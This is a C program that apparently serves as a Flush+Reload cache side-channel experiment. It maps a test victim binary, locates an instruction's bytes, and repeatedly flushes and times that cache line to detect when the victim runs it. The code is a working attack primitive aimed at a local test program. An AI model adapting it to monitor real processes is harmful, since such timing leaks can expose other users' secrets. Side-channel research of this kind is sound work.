#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/io.h>
#include <sys/mman.h>

#define L3_SIZE 3145728
#define VICTIM "./test2victim"

typedef struct char_array
{
	char* arr;
	int len;
} char_array;

uint64_t start, end;

__attribute__((always_inline)) void NOP_read(volatile char* ch)
{
	volatile char temp;
	temp = *ch;
}

__attribute__((always_inline)) uint64_t rdtsc()
{
	unsigned int lo, hi;
	__asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
	return ((uint64_t)hi << 32) | lo;
}

__attribute__((always_inline)) uint64_t record_access_time(volatile char* ch)
{
	uint32_t rv;
	__asm__ __volatile__ ("mfence\n"
						  "lfence\n"
						  "rdtscp\n"
						  "mov %%eax, %%esi\n"
						  "mov (%1), %%eax\n"
						  "rdtscp\n"
						  "sub %%esi, %%eax\n"
						  :"=&a" (rv): "r" (ch): "ecx", "edx", "esi");
	//start = rdtsc();
	//NOP_read(ch);
	//end = rdtsc();
	return rv;//end - start;
}

void clflush(volatile void *p)
{
    __asm__ __volatile__ ("clflush (%0)" :: "r"(p));
}

char_array load_file(char* path)
{
	int fd, status, size;
	struct stat s;
	char* f;
	char_array result;

	fd = open(path, O_RDONLY);

	if (fd < 0)
	{
		result.arr = NULL;
		result.len   = 0;
	}
	else
	{
		status = fstat (fd, & s);
	    size = s.st_size;
		f = (char*)mmap(0, size, PROT_READ, MAP_SHARED, fd, 0);

		result.arr = f;
		result.len = size;
    }

    return result;
}

int find_in_char_array(char_array file, char_array to_find)
{
	int i, j, found;

	for (i = 0; i < file.len - to_find.len; i++)
	{
		found = 1;
		for (j = 0; j < to_find.len; j++)
		{
			if (file.arr[i+j] != to_find.arr[j])
			{
				found = 0;
				break;
			}
		}
		if (found)
		{
			return i;
		}
	}

	return -1;
}

int main()
{
	int no_flush_time = 0;
	int yes_flush_time = 0;
	int time;
	volatile int i;
	int temp;
	char wanted_bytes[] = {0xc7, 0x45, 0xfc, 0x06, 0x00};
	char_array victim_elf;
	char_array looking_for = {wanted_bytes, 5};
	int offset;
	float avg_time, curr_avg_time;

	victim_elf = load_file(VICTIM);
	
	/*printf("Here is the victim, of length %d:\n", victim_elf.len);
	for (i = 0; i < victim_elf.len; i++)
	{
		printf("%c", victim_elf.arr[i]);
	}

	printf("\n");
	printf("Yay! now let's find the offset of the thing:\n");*/

	offset = find_in_char_array(victim_elf, looking_for);

	/*printf("Found this: %d\n", offset);
	printf("File in this place is:\n");
	for (i = 0; i < looking_for.len; i++)
	{
		printf("%c", victim_elf.arr[offset + i]);
	}
	printf("\n");*/

	//measure time when in cache
	no_flush_time = 0;
	yes_flush_time = 0;
	for (i = 0; i < 10000; i++)
	{
		//usleep(5000);
		NOP_read(victim_elf.arr + offset);
		//usleep(5000);
		temp = record_access_time(victim_elf.arr + offset);
		//usleep(5000);
		//printf("NOP_read: %d,		", temp);
		no_flush_time += temp;
	}
	for (i = 0; i < 10000; i++)
	{
		//usleep(5000);
		clflush(victim_elf.arr + offset);
		//usleep(5000);
		temp = record_access_time(victim_elf.arr + offset);
		//usleep(5000);
		//printf("clflush: %d\n", temp);
		yes_flush_time += temp;
	}
	avg_time = no_flush_time / 10000.0;

	printf("average reading time in cache:     %f\n", no_flush_time / 10000.0);
	printf("average reading time not in cache: %f\n", yes_flush_time / 10000.0);

	curr_avg_time = 0;//avg_time;
	time = 0;
	temp = 0;//10000;
	while (1)
	{
		//usleep(1000);
		clflush(victim_elf.arr + offset);
		usleep(1000);

		time = record_access_time(victim_elf.arr + offset);
		if (time >= 1000)
		{
			//printf("oh no! %d\n", time);
			continue;
		}
		curr_avg_time = curr_avg_time*temp + time;
		temp++;
		curr_avg_time /= temp;
		if (temp % 1000 == 0)
			printf("%f\t\t%d\n", curr_avg_time, time); //time/(++temp*1.0));
		if (temp % 20000 == 0)
		{
			printf("RESET\n");
			curr_avg_time = 0;//avg_time;
			time = 0;
			temp = 0;//10000;
		}
		/*if (time > avg_time)
		{
			printf("Bigger:  %f\n", time - avg_time);
		}
		else
		{
			printf("Smaller: %f\n", avg_time - time);
		}*/
	}
}